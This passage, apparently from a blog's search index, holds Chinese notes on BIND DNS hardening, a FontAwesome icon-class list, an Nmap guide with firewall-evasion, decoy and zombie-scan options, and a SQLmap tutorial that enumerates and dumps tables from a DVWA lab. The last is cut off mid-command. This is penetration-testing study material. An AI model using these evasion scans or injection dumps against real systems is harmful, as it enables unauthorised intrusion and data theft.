      <categories>
        <category>manual</category>
      </categories>
      <tags>
        <tag>Code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Liunx 服务配置笔记（六）：DNS 服务安全配置]]></title>
    <url>%2Farchives%2Fa8e13ac0.html</url>
    <content type="text"><![CDATA[这篇是 Liunx 的服务配置笔记系列第五篇,这一篇将具体介绍 Red Hat Liunx 下 DNS 服务的安全配置。所谓 DNS 就是一个域名解析服务器,其中 DNS 还包含正向解析和反向解析服务的安装创建挂载目录For Example:mkdir -p /mnt/cdrom 挂在光盘For Example:mount /dev/cdrom /mnt/cdrom 安装For Example:cd /mnt/cdrom/Server rpm -ivh bind-9.3.6-4.P1.el5_4.2.i386.rpm rpm -ivh caching-namedserver-9.3.6-4.P1.el5_4.2.i386.rpm 复制模板配置文件For Example:cd /etc/ cp -p named.caching-nameserver.conf named.conf 复制的时候,建议带上 -p 选项,否则不能使用该文件,如果忘记加上 -p 选项,不要紧,使用以下命令还可以挽救。chown named:named named.conf chown named:named named.zones 安全配置限制递归查询功能默认没有这个功能,需要手动添加。递归查询指 一般客户机和服务器之间属 递归查询 ,即当客户机向 DNS 服务器发 出请求后,若 DNS 服务器本身不能解析,则会向另外的 DNS 服务 器发出查询请求,得到结果后转交给客户机。这个选项,即可填 IP 地址,也可以填网络段,当然也可以填 any（所有）。修改主配置文件allow-recursion { 192.168.199.0/24;}; # 限制网段查询 allow-recursion { 192.168.199.2;}; # 限制 IP 查询 allow-recursion { any;}; # 所有的都可以查询 限制查询Default Configuration:allow-query { localhost;}; allow-query 配置项用来设置允许 DNS 查询的客户端地址,默认的客户端地址为本机。这里可以设置为某个网段、所有、具体的某台主机三种情况。修改主配置文件allow-query { 192.168.199.0/24;}; # 限制网段查询 allow-query { 192.168.199.2;}; # 限制 IP 查询 allow-query { any;}; # 所有的都可以查询 限制区传送默认没有这个功能,需要手动添加。如果没有限制区传送,那么 DNS 服务器允许对任何人都进行区域传输,因此网络架构中的主机名、主机 IP 列表、路由器名和路由 IP 列表,甚至包括各主机所在的位置和硬件配置等情况都很容易被入侵者得到在 DNS 配置文件中通过设置来限制允许区传送的主机,从一定程度上能减轻信息泄漏。修改主配置文件allow-transfer{ 192.168.199.0/24;}; # 限制网段查询 allow-transfer { 192.168.199.2;}; # 限制 IP 查询 allow-transfer { any;}; # 所有的都可以查询]]></content>
      <categories>
        <category>liunx</category>
      </categories>
      <tags>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
        <tag>Service</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FontAwesome 图标样式 CSS 参考清单]]></title>
    <url>%2Farchives%2F26e7f8f6.html</url>
    <content type="text"><![CDATA[在网站开发中多多少少都会使用到图标,这也是 HTML5 发展以来最具有特色的地方,也就是说,我们可以完全可以抛弃用图片当图标,现在就可以使用 CSS 样式加上字体库实现图标的引用引入使用.fa-icons{display:flex;flex-wrap:wrap}.fa-icons span{display:inline-flex;flex-direction:row;margin:1rem;justify-content:center;align-items:center}.fa-icons i{font-size:2rem;margin:.5rem}引入使用图标之前需要引入 CSS 文件,这里选用 FontAwesome 4.4.0 版本&lt;link href=&quot;//maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css&quot; rel=&quot;stylesheet&quot;&gt; 当然,还可以使用离线包,我们可以去官网下载它。http://fontawesome.io/使用&lt;i class=&quot;fa fa-home&quot;&gt;&lt;/i&gt; 更多使用方法请查看官方例子 http://fontawesome.io/examples/#animated图标 CSS 清单66 New Icons in 4.4 .fa-500px .fa-amazon .fa-balance-scale .fa-battery-0 .fa-battery-1 .fa-battery-2 .fa-battery-3 .fa-battery-4 .fa-battery-empty .fa-battery-full .fa-battery-half .fa-battery-quarter .fa-battery-three-quarters .fa-black-tie .fa-calendar-check-o .fa-calendar-minus-o .fa-calendar-plus-o .fa-calendar-times-o .fa-cc-diners-club .fa-cc-jcb .fa-chrome .fa-clone .fa-commenting .fa-commenting-o .fa-contao .fa-creative-commons .fa-expeditedssl .fa-firefox .fa-fonticons .fa-genderless .fa-get-pocket .fa-gg .fa-gg-circle .fa-hand-grab-o .fa-hand-lizard-o .fa-hand-paper-o .fa-hand-peace-o .fa-hand-pointer-o .fa-hand-rock-o .fa-hand-scissors-o .fa-hand-spock-o .fa-hand-stop-o .fa-hourglass .fa-hourglass-1 .fa-hourglass-2 .fa-hourglass-3 .fa-hourglass-end .fa-hourglass-half .fa-hourglass-o .fa-hourglass-start .fa-houzz .fa-i-cursor .fa-industry .fa-internet-explorer .fa-map .fa-map-o .fa-map-pin .fa-map-signs .fa-mouse-pointer .fa-object-group .fa-object-ungroup .fa-odnoklassniki .fa-odnoklassniki-square .fa-opencart .fa-opera .fa-optin-monster .fa-registered .fa-safari .fa-sticky-note .fa-sticky-note-o .fa-television .fa-trademark .fa-tripadvisor .fa-tv .fa-vimeo .fa-wikipedia-w .fa-y-combinator .fa-ycWeb Application Icons .fa-adjust .fa-anchor .fa-archive .fa-area-chart .fa-arrows .fa-arrows-h .fa-arrows-v .fa-asterisk .fa-at .fa-automobile .fa-balance-scale .fa-ban .fa-bank .fa-bar-chart .fa-bar-chart-o .fa-barcode .fa-bars .fa-battery-0 .fa-battery-1 .fa-battery-2 .fa-battery-3 .fa-battery-4 .fa-battery-empty .fa-battery-full .fa-battery-half .fa-battery-quarter .fa-battery-three-quarters .fa-bed .fa-beer .fa-bell .fa-bell-o .fa-bell-slash .fa-bell-slash-o .fa-bicycle .fa-binoculars .fa-birthday-cake .fa-bolt .fa-bomb .fa-book .fa-bookmark .fa-bookmark-o .fa-briefcase .fa-bug .fa-building .fa-building-o .fa-bullhorn .fa-bullseye .fa-bus .fa-cab .fa-calculator .fa-calendar .fa-calendar-check-o .fa-calendar-minus-o .fa-calendar-o .fa-calendar-plus-o .fa-calendar-times-o .fa-camera .fa-camera-retro .fa-car .fa-caret-square-o-down .fa-caret-square-o-left .fa-caret-square-o-right .fa-caret-square-o-up .fa-cart-arrow-down .fa-cart-plus .fa-cc .fa-certificate .fa-check .fa-check-circle .fa-check-circle-o .fa-check-square .fa-check-square-o .fa-child .fa-circle .fa-circle-o .fa-circle-o-notch .fa-circle-thin .fa-clock-o .fa-clone .fa-close .fa-cloud .fa-cloud-download .fa-cloud-upload .fa-code .fa-code-fork .fa-coffee .fa-cog .fa-cogs .fa-comment .fa-comment-o .fa-commenting .fa-commenting-o .fa-comments .fa-comments-o .fa-compass .fa-copyright .fa-creative-commons .fa-credit-card .fa-crop .fa-crosshairs .fa-cube .fa-cubes .fa-cutlery .fa-dashboard .fa-database .fa-desktop .fa-diamond .fa-dot-circle-o .fa-download .fa-edit .fa-ellipsis-h .fa-ellipsis-v .fa-envelope .fa-envelope-o .fa-envelope-square .fa-eraser .fa-exchange .fa-exclamation .fa-exclamation-circle .fa-exclamation-triangle .fa-external-link .fa-external-link-square .fa-eye .fa-eye-slash .fa-eyedropper .fa-fax .fa-feed .fa-female .fa-fighter-jet .fa-file-archive-o .fa-file-audio-o .fa-file-code-o .fa-file-excel-o .fa-file-image-o .fa-file-movie-o .fa-file-pdf-o .fa-file-photo-o .fa-file-picture-o .fa-file-powerpoint-o .fa-file-sound-o .fa-file-video-o .fa-file-word-o .fa-file-zip-o .fa-film .fa-filter .fa-fire .fa-fire-extinguisher .fa-flag .fa-flag-checkered .fa-flag-o .fa-flash .fa-flask .fa-folder .fa-folder-o .fa-folder-open .fa-folder-open-o .fa-frown-o .fa-futbol-o .fa-gamepad .fa-gavel .fa-gear .fa-gears .fa-gift .fa-glass .fa-globe .fa-graduation-cap .fa-group .fa-hand-grab-o .fa-hand-lizard-o .fa-hand-paper-o .fa-hand-peace-o .fa-hand-pointer-o .fa-hand-rock-o .fa-hand-scissors-o .fa-hand-spock-o .fa-hand-stop-o .fa-hdd-o .fa-headphones .fa-heart .fa-heart-o .fa-heartbeat .fa-history .fa-home .fa-hotel .fa-hourglass .fa-hourglass-1 .fa-hourglass-2 .fa-hourglass-3 .fa-hourglass-end .fa-hourglass-half .fa-hourglass-o .fa-hourglass-start .fa-i-cursor .fa-image .fa-inbox .fa-industry .fa-info .fa-info-circle .fa-institution .fa-key .fa-keyboard-o .fa-language .fa-laptop .fa-leaf .fa-legal .fa-lemon-o .fa-level-down .fa-level-up .fa-life-bouy .fa-life-buoy .fa-life-ring .fa-life-saver .fa-lightbulb-o .fa-line-chart .fa-location-arrow .fa-lock .fa-magic .fa-magnet .fa-mail-forward .fa-mail-reply .fa-mail-reply-all .fa-male .fa-map .fa-map-marker .fa-map-o .fa-map-pin .fa-map-signs .fa-meh-o .fa-microphone .fa-microphone-slash .fa-minus .fa-minus-circle .fa-minus-square .fa-minus-square-o .fa-mobile .fa-mobile-phone .fa-money .fa-moon-o .fa-mortar-board .fa-motorcycle .fa-mouse-pointer .fa-music .fa-navicon .fa-newspaper-o .fa-object-group .fa-object-ungroup .fa-paint-brush .fa-paper-plane .fa-paper-plane-o .fa-paw .fa-pencil .fa-pencil-square .fa-pencil-square-o .fa-phone .fa-phone-square .fa-photo .fa-picture-o .fa-pie-chart .fa-plane .fa-plug .fa-plus .fa-plus-circle .fa-plus-square .fa-plus-square-o .fa-power-off .fa-print .fa-puzzle-piece .fa-qrcode .fa-question .fa-question-circle .fa-quote-left .fa-quote-right .fa-random .fa-recycle .fa-refresh .fa-registered .fa-remove .fa-reorder .fa-reply .fa-reply-all .fa-retweet .fa-road .fa-rocket .fa-rss .fa-rss-square .fa-search .fa-search-minus .fa-search-plus .fa-send .fa-send-o .fa-server .fa-share .fa-share-alt .fa-share-alt-square .fa-share-square .fa-share-square-o .fa-shield .fa-ship .fa-shopping-cart .fa-sign-in .fa-sign-out .fa-signal .fa-sitemap .fa-sliders .fa-smile-o .fa-soccer-ball-o .fa-sort .fa-sort-alpha-asc .fa-sort-alpha-desc .fa-sort-amount-asc .fa-sort-amount-desc .fa-sort-asc .fa-sort-desc .fa-sort-down .fa-sort-numeric-asc .fa-sort-numeric-desc .fa-sort-up .fa-space-shuttle .fa-spinner .fa-spoon .fa-square .fa-square-o .fa-star .fa-star-half .fa-star-half-empty .fa-star-half-full .fa-star-half-o .fa-star-o .fa-sticky-note .fa-sticky-note-o .fa-street-view .fa-suitcase .fa-sun-o .fa-support .fa-tablet .fa-tachometer .fa-tag .fa-tags .fa-tasks .fa-taxi .fa-television .fa-terminal .fa-thumb-tack .fa-thumbs-down .fa-thumbs-o-down .fa-thumbs-o-up .fa-thumbs-up .fa-ticket .fa-times .fa-times-circle .fa-times-circle-o .fa-tint .fa-toggle-down .fa-toggle-left .fa-toggle-off .fa-toggle-on .fa-toggle-right .fa-toggle-up .fa-trademark .fa-trash .fa-trash-o .fa-tree .fa-trophy .fa-truck .fa-tty .fa-tv .fa-umbrella .fa-university .fa-unlock .fa-unlock-alt .fa-unsorted .fa-upload .fa-user .fa-user-plus .fa-user-secret .fa-user-times .fa-users .fa-video-camera .fa-volume-down .fa-volume-off .fa-volume-up .fa-warning .fa-wheelchair .fa-wifi .fa-wrenchHand Icons .fa-hand-grab-o .fa-hand-lizard-o .fa-hand-o-down .fa-hand-o-left .fa-hand-o-right .fa-hand-o-up .fa-hand-paper-o .fa-hand-peace-o .fa-hand-pointer-o .fa-hand-rock-o .fa-hand-scissors-o .fa-hand-spock-o .fa-hand-stop-o .fa-thumbs-down .fa-thumbs-o-down .fa-thumbs-o-up .fa-thumbs-upTransportation Icons .fa-ambulance .fa-automobile .fa-bicycle .fa-bus .fa-cab .fa-car .fa-fighter-jet .fa-motorcycle .fa-plane .fa-rocket .fa-ship .fa-space-shuttle .fa-subway .fa-taxi .fa-train .fa-truck .fa-wheelchairGender Icons .fa-genderless .fa-intersex .fa-mars .fa-mars-double .fa-mars-stroke .fa-mars-stroke-h .fa-mars-stroke-v .fa-mercury .fa-neuter .fa-transgender .fa-transgender-alt .fa-venus .fa-venus-double .fa-venus-marsFile Type Icons .fa-file .fa-file-archive-o .fa-file-audio-o .fa-file-code-o .fa-file-excel-o .fa-file-image-o .fa-file-movie-o .fa-file-o .fa-file-pdf-o .fa-file-photo-o .fa-file-picture-o .fa-file-powerpoint-o .fa-file-sound-o .fa-file-text .fa-file-text-o .fa-file-video-o .fa-file-word-o .fa-file-zip-oSpinner Icons .fa-circle-o-notch .fa-cog .fa-gear .fa-refresh .fa-spinnerForm Control Icons .fa-check-square .fa-check-square-o .fa-circle .fa-circle-o .fa-dot-circle-o .fa-minus-square .fa-minus-square-o .fa-plus-square .fa-plus-square-o .fa-square .fa-square-oPayment Icons .fa-cc-amex .fa-cc-diners-club .fa-cc-discover .fa-cc-jcb .fa-cc-mastercard .fa-cc-paypal .fa-cc-stripe .fa-cc-visa .fa-credit-card .fa-google-wallet .fa-paypalChart Icons .fa-area-chart .fa-bar-chart .fa-bar-chart-o .fa-line-chart .fa-pie-chartCurrency Icons .fa-bitcoin .fa-btc .fa-cny .fa-dollar .fa-eur .fa-euro .fa-gbp .fa-gg .fa-gg-circle .fa-ils .fa-inr .fa-jpy .fa-krw .fa-money .fa-rmb .fa-rouble .fa-rub .fa-ruble .fa-rupee .fa-shekel .fa-sheqel .fa-try .fa-turkish-lira .fa-usd .fa-won .fa-yenText Editor Icons .fa-align-center .fa-align-justify .fa-align-left .fa-align-right .fa-bold .fa-chain .fa-chain-broken .fa-clipboard .fa-columns .fa-copy .fa-cut .fa-dedent .fa-eraser .fa-file .fa-file-o .fa-file-text .fa-file-text-o .fa-files-o .fa-floppy-o .fa-font .fa-header .fa-indent .fa-italic .fa-link .fa-list .fa-list-alt .fa-list-ol .fa-list-ul .fa-outdent .fa-paperclip .fa-paragraph .fa-paste .fa-repeat .fa-rotate-left .fa-rotate-right .fa-save .fa-scissors .fa-strikethrough .fa-subscript .fa-superscript .fa-table .fa-text-height .fa-text-width .fa-th .fa-th-large .fa-th-list .fa-underline .fa-undo .fa-unlinkDirectional Icons .fa-angle-double-down .fa-angle-double-left .fa-angle-double-right .fa-angle-double-up .fa-angle-down .fa-angle-left .fa-angle-right .fa-angle-up .fa-arrow-circle-down .fa-arrow-circle-left .fa-arrow-circle-o-down .fa-arrow-circle-o-left .fa-arrow-circle-o-right .fa-arrow-circle-o-up .fa-arrow-circle-right .fa-arrow-circle-up .fa-arrow-down .fa-arrow-left .fa-arrow-right .fa-arrow-up .fa-arrows .fa-arrows-alt .fa-arrows-h .fa-arrows-v .fa-caret-down .fa-caret-left .fa-caret-right .fa-caret-square-o-down .fa-caret-square-o-left .fa-caret-square-o-right .fa-caret-square-o-up .fa-caret-up .fa-chevron-circle-down .fa-chevron-circle-left .fa-chevron-circle-right .fa-chevron-circle-up .fa-chevron-down .fa-chevron-left .fa-chevron-right .fa-chevron-up .fa-exchange .fa-hand-o-down .fa-hand-o-left .fa-hand-o-right .fa-hand-o-up .fa-long-arrow-down .fa-long-arrow-left .fa-long-arrow-right .fa-long-arrow-up .fa-toggle-down .fa-toggle-left .fa-toggle-right .fa-toggle-upVideo Player Icons .fa-arrows-alt .fa-backward .fa-compress .fa-eject .fa-expand .fa-fast-backward .fa-fast-forward .fa-forward .fa-pause .fa-play .fa-play-circle .fa-play-circle-o .fa-random .fa-step-backward .fa-step-forward .fa-stop .fa-youtube-playBrand Icons .fa-500px .fa-adn .fa-amazon .fa-android .fa-angellist .fa-apple .fa-behance .fa-behance-square .fa-bitbucket .fa-bitbucket-square .fa-bitcoin .fa-black-tie .fa-btc .fa-buysellads .fa-cc-amex .fa-cc-diners-club .fa-cc-discover .fa-cc-jcb .fa-cc-mastercard .fa-cc-paypal .fa-cc-stripe .fa-cc-visa .fa-chrome .fa-codepen .fa-connectdevelop .fa-contao .fa-css3 .fa-dashcube .fa-delicious .fa-deviantart .fa-digg .fa-dribbble .fa-dropbox .fa-drupal .fa-empire .fa-expeditedssl .fa-facebook .fa-facebook-f .fa-facebook-official .fa-facebook-square .fa-firefox .fa-flickr .fa-fonticons .fa-forumbee .fa-foursquare .fa-ge .fa-get-pocket .fa-gg .fa-gg-circle .fa-git .fa-git-square .fa-github .fa-github-alt .fa-github-square .fa-gittip .fa-google .fa-google-plus .fa-google-plus-square .fa-google-wallet .fa-gratipay .fa-hacker-news .fa-houzz .fa-html5 .fa-instagram .fa-internet-explorer .fa-ioxhost .fa-joomla .fa-jsfiddle .fa-lastfm .fa-lastfm-square .fa-leanpub .fa-linkedin .fa-linkedin-square .fa-linux .fa-maxcdn .fa-meanpath .fa-medium .fa-odnoklassniki .fa-odnoklassniki-square .fa-opencart .fa-openid .fa-opera .fa-optin-monster .fa-pagelines .fa-paypal .fa-pied-piper .fa-pied-piper-alt .fa-pinterest .fa-pinterest-p .fa-pinterest-square .fa-qq .fa-ra .fa-rebel .fa-reddit .fa-reddit-square .fa-renren .fa-safari .fa-sellsy .fa-share-alt .fa-share-alt-square .fa-shirtsinbulk .fa-simplybuilt .fa-skyatlas .fa-skype .fa-slack .fa-slideshare .fa-soundcloud .fa-spotify .fa-stack-exchange .fa-stack-overflow .fa-steam .fa-steam-square .fa-stumbleupon .fa-stumbleupon-circle .fa-tencent-weibo .fa-trello .fa-tripadvisor .fa-tumblr .fa-tumblr-square .fa-twitch .fa-twitter .fa-twitter-square .fa-viacoin .fa-vimeo .fa-vimeo-square .fa-vine .fa-vk .fa-wechat .fa-weibo .fa-weixin .fa-whatsapp .fa-wikipedia-w .fa-windows .fa-wordpress .fa-xing .fa-xing-square .fa-y-combinator .fa-y-combinator-square .fa-yahoo .fa-yc .fa-yc-square .fa-yelp .fa-youtube .fa-youtube-play .fa-youtube-squareMedical Icons .fa-ambulance .fa-h-square .fa-heart .fa-heart-o .fa-heartbeat .fa-hospital-o .fa-medkit .fa-plus-square .fa-stethoscope .fa-user-md .fa-wheelchair]]></content>
      <categories>
        <category>design</category>
      </categories>
      <tags>
        <tag>CSS</tag>
        <tag>HTML5</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透工具用法（三）：Nmap 的用法]]></title>
    <url>%2Farchives%2F2a42c61c.html</url>
    <content type="text"><![CDATA[此系列笔记是网络渗透工具的使用方法,本篇是介绍端口扫描工具 Nmap 的使用方法。Nmap 在渗透测试中经常用到,它不仅可以用来确定目标网络上计算机的存活状态,而且可以扫描各个计算机的操作系统、开放端口、服务,还有可能获得用户的证书。熟练掌握 Nmap 的用法,可以极大的提高渗透测试技术Nmap 环境kali Liunx 里已经集成了 Namp 环境,所以就不在 Windows 下进行了。Nmap 命令结构Scanning Format:nmap -[option] [IP or domain] -oN [fileName.txt] Nmap 使用解释识别系统Scanning Format:nmap -O -Pn [IP or domain] 使用 -O 选项,可以获取到被扫描的主机的系统。 -Pn 选项禁用 Nmap 网络发现功能,假定所有系统都是活动的Timing 模板timing 参数可以指定 nmap 扫描的速度。其中各个选项如下：T0 =&gt; paranoid 慢速网络扫描,串行扫描,两次扫描间隔 5 分钟。扫描速度极慢。T1 =&gt; Sneky 慢速网络扫描,串行扫描,两次扫描间隔 15 秒,扫描速度较慢。T2 =&gt; Polite 中速网络扫描,串行扫描,两次扫描间隔 400 毫秒,扫描速度慢。T3 =&gt; Normal 中速网络扫描,并行扫描,两次扫描间隔 0 秒,扫描速度正常。T4 =&gt; Aggressive 快速网络扫描,并行扫描,两次扫描间隔 0 秒,扫描速度较快。T5 =&gt; Normal 快速网络扫描,并行扫描,两次扫描间隔 0 秒,扫描速度极快。Scanning Format:nmap -T[0-5] [IP or domain] 扫描方式TCP 扫描端口扫描中最稳定的,利用的是 TCP 三次握手。TCP 扫描通常用于收集有关目标的更多信息,但是会和目标主机建立一个完成的 TCP 连接。Scanning Format:nmap -sT -Pn [IP or domain] -sT TCP 连接扫描（s ==&gt; 哪种类型扫描；T ==&gt; TCP 类型）SYN 扫描TCP 两次握手（隐藏扫描,速度快,nmap 缺省参数）Scanning Format:nmap -sS -Pn [IP or domain] -sS SYN 连接扫描（s ==&gt; 哪种类型扫描；S ==&gt; SYN 类型）ACK 扫描ACK 扫描,用于确定 TCP 端口是否被防火墙过滤。Scanning Format:nmap -sA -Pn [IP or domain] -sA ACK 连接扫描（s ==&gt; 哪种类型扫描；A ==&gt; ACK 类型）UDP 扫描DHCP,DNS,SNMP,TFTP 等都使用了 UDP 协议；UDP 扫描会评估目标系统上的 UDP 端口,可以确认 UDP 端口是开放还是被防火墙过滤。Scanning Format:nmap -sU -Pn [IP or domain] -sU UDP 连接扫描（s ==&gt; 哪种类型扫描；U ==&gt; UDP 类型）-sV UDP 扫描中添加版本扫描信息（V ==&gt; 版本信息）不存在 -Pn 参数（从 UDP 协议去理解,你发了就 ok 管他收没收到）扫描 IP 段For Example:nmap 192.168.1.1-255 # 扫描 192.168.1.1－192.168.1.255 所有 IP nmap 192.168.1.1/24 # 扫描 192.168.1.1－192.168.1.255 所有 IP nmap -iL IPL.txt # 扫描 IPL.txt 中保存的所有 IP 输出保存选项-oN =&gt; 保存为文本文件-oX =&gt; 保存为 XML 文件-oG =&gt; 保存为 GREPable 输出-oS =&gt; 脚本输出其他更详细的扫描Nmap 扫描策略# 适用所有大小网络最好的 nmap 扫描策略 # 主机发现,生成存活主机列表 nmap -sn -T4 -oG Discovery.gnmap 192.168.56.0/24 grep &quot;Status: Up&quot; Discovery.gnmap | cut -f 2 -d &#39; &#39; &gt; LiveHosts.txt # 端口发现,发现大部分常用端口 # https//nmap.org/presentations/BHDC08/bhdc08-slides-fyodor.pdf nmap -sS -T4 -Pn -oG TopTCP -iL LiveHosts.txt nmap -sU -T4 -Pn -oN TopUDP -iL LiveHosts.txt nmap -sS -T4 -Pn --top-ports 3674 -oG 3674 -iL LiveHosts.txt # 端口发现,发现全部端口,但 UDP 端口的扫描会非常慢 nmap -sS -T4 -Pn -p 0-65535 -oN FullTCP -iL LiveHosts.txt nmap -sU -T4 -Pn -p 0-65535 -oN FullUDP -iL LiveHosts.txt # 显示 TCP\UDP 端口 grep &quot;open&quot; FullTCP|cut -f 1 -d &#39; &#39; | sort -nu | cut -f 1 -d &#39;/&#39; |xargs | sed &#39;s/ /,/g&#39;|awk &#39;{print &quot;T:&quot;$0}&#39; grep &quot;open&quot; FullUDP|cut -f 1 -d &#39; &#39; | sort -nu | cut -f 1 -d &#39;/&#39; |xargs | sed &#39;s/ /,/g&#39;|awk &#39;{print &quot;U:&quot;$0}&#39; # 侦测服务版本 nmap -sV -T4 -Pn -oG ServiceDetect -iL LiveHosts.txt # 扫做系统扫描 nmap -O -T4 -Pn -oG OSDetect -iL LiveHosts.txt # 系统和服务检测 nmap -O -sV -T4 -Pn -p U:53,111,137,T:21-25,80,139,8080 -oG OS_Service_Detect -iL LiveHosts.txt # 扫描 B 段的存活主机 nmap -v -sn -PE -n --min-hostgroup 1024 --min-parallelism 1024 172.16.0.0/16 | grep -v down | grep &quot;172.16.&quot; Nmap 躲避防火墙# 分段 nmap -f # 修改默认 MTU 大小,但必须为 8 的倍数(8,16,24,32 等等) nmap --mtu 24 # 生成随机数量的欺骗 nmap -D RND:10 [target] # 手动指定欺骗使用的 IP nmap -D decoy1,decoy2,decoy3 etc. # 僵尸网络扫描, 首先需要找到僵尸网络的IP nmap -sI [Zombie IP] [Target IP] # 指定源端口号 nmap --source-port 80 IP # 在每个扫描数据包后追加随机数量的数据 nmap --data-length 25 IP # MAC 地址欺骗,可以生成不同主机的 MAC 地址 nmap --spoof-mac Dell/Apple/3Com IP Nmap 进行 Web 漏洞扫描cd /usr/share/nmap/scripts/ wget https://www.computec.ch/projekte/vulscan/download/nmap_nse_vulscan-2.0.tar.gz &amp;&amp; tar xzf nmap_nse_vulscan-2.0.tar.gz nmap -sS -sV --script=vulscan/vulscan.nse target nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv target nmap -sS -sV --script=vulscan/vulscan.nse –script-args vulscandb=scipvuldb.csv -p80 target nmap -PN -sS -sV --script=vulscan –script-args vulscancorrelation=1 -p80 target nmap -sV --script=vuln target nmap -PN -sS -sV --script=all –script-args vulscancorrelation=1 target Nmap 端口扫描# 使用诱饵隐蔽扫描 nmap -D RND:10 [target] (生成随机数量的诱饵) # fargement # data packed – like orginal one not scan packet # 使用 auxiliary/scanner/ip/ipidseq 来在僵尸网络中查找IP并使用这些IP进行扫描 — nmap -sI ip target # nmap –source-port 53 target nmap -sS -sV -D IP1,IP2,IP3,IP4,IP5 -f –mtu=24 –data-length=1337 -T2 target (随机使用不同的IP进行扫描) nmap -Pn -T2 -sV –randomize-hosts IP1,IP2 nmap –script smb-check-vulns.nse -p445 target (使用 NSE 脚本) nmap -sU -P0 -T Aggressive -p123 target (攻击式扫描 T1-T5) nmap -sA -PN -sN target nmap -sS -sV -T5 -F -A -O target (版本检测) nmap -sU -v target (Udp) nmap -sU -P0 (Udp) nmap -sC 192.168.31.10-12 (全部使用默认配置) 示例扫描示例一：SYN 扫描For Example:nmap -sS -T5 192.168.199.133 示例二：基础信息扫描For Example:nmap -O 192.168.199.133 示例三：详细信息扫描For Example:nmap -A 192.168.199.133 示例四：网段扫描For Example:nmap -T5 192.168.1.103-110]]></content>
      <categories>
        <category>pentest</category>
      </categories>
      <tags>
        <tag>Pentest</tag>
        <tag>Security</tag>
        <tag>Liunx</tag>
        <tag>Protocol</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[渗透工具用法（一）：SQLmap 的用法]]></title>
    <url>%2Farchives%2Fb58c2725.html</url>
    <content type="text"><![CDATA[此系列笔记是网络渗透工具的使用方法,本篇是介绍 SQL 注入工具 SQLmap 的使用方法。SQLmap 是一款用来检测与利用 SQL 注入漏洞的免费开源工具,有一个非常棒的特性,即对检测与利用的自动化处理（数据库指纹、访问底层文件系统、执行命令）SQLmap 环境由于 kali Liunx 已经集成了 SQLmap 的环境,这里就直接介绍 Windows 下环境的构建。先安装 Python正常情况下我们安装 2.7.x 就好了。Python 官网下载地址接下来只需在环境变量 path 中添加 Python 的安装路径就好了。再安装 SQLmapSQLmap 官网下载地址将 SQLmap 解压至 Python 目录下,将 SQLmap 的程序目录重命名为 sqlmap。在桌面新建快捷方式For Example:DVWA 环境DVWA(Dam Vulnerable Web Application) 使用 PHP+Mysql 编写的一套用于常规 WEB 漏洞教学和检测的 WEB 脆弱性测试程序。包含 SQL 注入、XSS、盲注等常见的一些漏洞。DVWA GitHub 下载地址在 Windows 下还需安装 PHP 环境,这里推介两个 PHP 集成环境。upupw PHP 集成环境 phpStudy PHP 集成环境接下来只需修改一下配置文件就好了。SQlmap 使用方法Windows 下跟 kali Liunx 下使用方法不相同。为方便演示,我们创建两个虚拟机：受害者机器,Windows 2003 操作系统,运行一个 WEB 服务器,同时跑着一个包含漏洞的 WEB 应用（DVWA）。攻击器机器,使用 kali Liunx 或者其他版本的 Windows 包含 SQLmap 程序。本次实验的目的：使用 SQLmap 得到以下信息：枚举 MYSQL 用户名与密码。枚举所有数据库。枚举指定数据库的数据表。枚举指定数据表中的所有用户名与密码。查看帮助Windows：查看 Python 帮助命令python sqlmap.py -h kali Liunx：查看 Python 帮助命令sqlmap -h 需要注意的是 Windows 下的选项和 kali Liunx 下的选项是一致的,但是命令是不一致的。在 Windows 下使用 python sqlmap.py,而在 kali Liunx 下使用的是 sqlmap。选项解释—cookie =&gt; 设置我们的 cookie 值 “将 DVWA 安全等级设置为 low”—data =&gt; 设置 POST 提交的值,如果是 GET 提交,不需要此选项-u =&gt; 指定目标 URL-b =&gt; 获取 DBMS banner—current-db =&gt; 获取当前数据库—current-user =&gt; 获取当前数据库的用户—tables =&gt; 获取数据库里所有的表名—columns =&gt; 获取表里的所有字段—dump =&gt; 获取值—current-user =&gt; 获取当前用户-D =&gt; 爆库指定数据库名-T =&gt; 爆库指定表名-C =&gt; 爆库指定字段名—string =&gt; 当查询可用时用来匹配页面中的字符串—users =&gt; 枚举 DBMS 用户—password =&gt; 枚举 DBMS 用户密码 hash—dbs =&gt; 枚举 DBMS 中的数据库开始爆库由于 Windows 和 kali Liunx 的做法基本一致,这里以 kali Liunx 为例。DVWA 的难度为 low。先获取 Cookie每一次的 Cookie 都不一样,这里是个示范。For Example:获取数据库,—current-dbFor Example:sqlmap -u &quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot; --current-db URL 地址和 Cookie 请用真实的替换掉。这条命令可以把当前所有的数据库获取出来的。注意 --current-db 的 - 可是有两个的。获取表,—tables前面,我们已经获取到数据库名,这时候我们要指定数据库名。使用 -D 选项指定数据库名。注意 --tables 的 - 可是有两个的。For Example:sqlmap -u &quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot; -D &#39;dvwa&#39; --tables 获取字段,—columns前面,我们已经获取到数据库名和表名了,这时候我们要指定数据库名和表名。使用 -D 选项指定数据库名,使用 -T 指定表名。这里我们选择表 users。注意 --columns 的 - 可是有两个的。For Example:sqlmap -u &quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot; -D &#39;dvwa&#39; -T &#39;users&#39; --columns 获取数据,—dump前面,我们已经获取到数据库名、表名还有字段名了,这时候我们要指定数据库名、表名还有字段名。使用 -D 选项指定数据库名,使用 -T 指定表名,使用 -C 指定字段名。这里我们选择表 users中的字段 user_id。注意 --dump 的 - 可是有两个的。For Example:sqlmap -u &quot;//192.168.79.132/vulnerabilities/sqli/?id=1&amp;Submit=Submit#&quot; --cookie=&quot;PHPSESSID=austaukdtb8jq2919eideuqkp3;security=low&quot; -D &#39;dvwa&#39; -T 